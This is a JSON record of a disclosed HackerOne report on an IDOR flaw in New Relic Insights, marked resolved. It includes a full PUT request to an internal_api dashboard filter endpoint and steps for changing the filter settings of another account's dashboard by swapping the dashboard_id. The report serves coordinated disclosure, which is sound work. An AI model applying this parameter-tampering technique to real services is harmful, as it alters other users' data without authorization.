{
  "id": 459443,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80NTk0NDM=",
  "url": "https://hackerone.com/reports/459443",
  "title": "[NR Insights] IDOR - Modify the filter settings for any NR Insights dashboard through internal_api endpoint",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "high",
  "readable_substate": "Resolved",
  "created_at": "2018-12-09T23:08:25.927Z",
  "submitted_at": "2018-12-09T23:08:25.927Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "jon_bottarini",
    "url": "/jon_bottarini",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/013/784/e3a368de321ded9a9b2118272e89bffd355380e5_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 17011,
    "url": "https://hackerone.com/newrelic",
    "handle": "newrelic",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/3813a300hyp02ziarjcgo7ph6uxv/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/3813a300hyp02ziarjcgo7ph6uxv/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "New Relic",
      "twitter_handle": "newrelic",
      "website": "https://newrelic.com",
      "about": "New Relic's Coordinated Disclosure Program"
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2020-09-04T11:00:29.946Z",
  "bug_reporter_agreed_on_going_public_at": "2020-08-20T02:42:46.278Z",
  "team_member_agreed_on_going_public_at": "2020-09-04T11:00:29.854Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "An IDOR exists allowing me to change the filter settings of any account on New Relic through the following PUT request: \n\n```\nPUT /internal_api/1/accounts/1523936/dashboards/687944/filter HTTP/1.1\nHost: insights.newrelic.com\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:63.0) Gecko/20100101 Firefox/63.0\nAccept: application/json, text/plain, */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://insights.newrelic.com/accounts/1523936/dashboards/687944?editing=true\nX-NewRelic-ID: VwUFUVRaGwsFUVZT\nX-Requested-With: XMLHttpRequest\nContent-Type: application/json;charset=utf-8\nX-CSRF-Token: mycsrftoken\nX-Insights-Timezone: America/Phoenix\nContent-Length: 96\nDNT: 1\nConnection: close\nCookie: mycookies\n\n{\"dashboard_id\":687944,\"event_types\":[\"SyntheticsPrivateLocationStatus\"],\"key_names\":[1],\"enabled\":true,\"smart_filter\":true}\n```\n\nIn this request the `dashboard_id` within the request body is not being validated, meaning that I can change this `dashboard_id` to any other number corresponding to a NR Insights dashboard, and I'll be able to modify the filter settings of other accounts. \n\nThe application _expects_ this value to be `687944` - which corresponds to the dashboard ID that I am currently modifying. However - if I change this value to `790637` (the dashboard ID of my completely separate, other account) the request is successful. \n\n## Steps to Reproduce  \n\n1. From account A (victim) create a dashboard in NR Insights \n2. Copy down the dashboard ID for the dashboard you just created. Filter settings will be turned off be default. \n3. From account B (attacker) create a dashboard on your NR Insights account. \n4. Once created, click on \"Edit\" and then click the gear next to the \"filter disabled\" section\n5. Change the settings on the filter and intercept the PUT request I pasted above to the `/internal_api/1/accounts/ACCOUNTID/dashboards/DASHBOARDNUMBER/filter` endpoint \n6. Change the `dashboard_id` number from the dashboard of account B to the victim's dashboard number. \n\nTo confirm this, log back in to the victims account and you'll notice that the filter has been turned on the dashboard. \n\nThe response will look like this: \n\n\n```{\"id\":642149,\"dashboard_id\":790637,\"key_names\":[],\"event_types\":[\"SyntheticsPrivateLocationStatus\"],\"filter_first\":false,\"description\":{\"plural\":\"\",\"singular\":\"\"},\"escaped_event_types\":\"`SyntheticsPrivateLocationStatus`\"}```\n\nWherein `\"dashboard_id\":790637` corresponds to the victim account.\n\n## Impact\n\nI can enable a filter for every New Relic dashboard.",
  "bounty_amount": "2500.0",
  "formatted_bounty": "$2,500",
  "weakness": {
    "id": 55,
    "name": "Insecure Direct Object Reference (IDOR)"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2020-09-19T02:42:46.321Z",
  "allow_singular_disclosure_after": -107346730.66997303,
  "singular_disclosure_allowed": true,
  "vote_count": 27,
  "voters": [
    "int0x13",
    "wi11",
    "n1m0",
    "ltidi",
    "ali",
    "ahiezer",
    "sudi",
    "f1ras",
    "prateek_thakare",
    "cryptographer",
    "and 17 more..."
  ],
  "severity": {
    "rating": "high",
    "author_type": "Team"
  },
  "structured_scope": {
    "databaseId": 12650,
    "asset_type": "URL",
    "asset_identifier": "insights.newrelic.com",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
